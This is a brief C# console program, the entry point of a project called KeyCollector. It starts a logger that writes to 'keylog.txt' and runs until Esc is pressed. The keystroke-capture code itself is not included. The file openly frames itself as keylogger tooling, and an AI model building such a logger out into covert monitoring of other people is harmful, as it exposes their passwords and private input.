using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace KeyCollector
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[Starting logger thread]");
            Logger logger = new Logger("keylog.txt");

            // loop until exit is requested
            Console.WriteLine("Press [esc] to exit");
            while (true)
            {
                // don't use too much CPU
                System.Threading.Thread.Sleep(100);

                // check if [esc] was pressed
                if (Console.KeyAvailable)
                {
                    ConsoleKeyInfo key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Escape)
                    {
                        break;
                    }
                }
            } 

            // shutdown the logger thread
            Console.WriteLine("[Stopping logger thread]");
            logger.close();
            Console.WriteLine("[Logger Stopped]");

            // final delay to allow last message to be read
            System.Threading.Thread.Sleep(500);
        }
    }
}
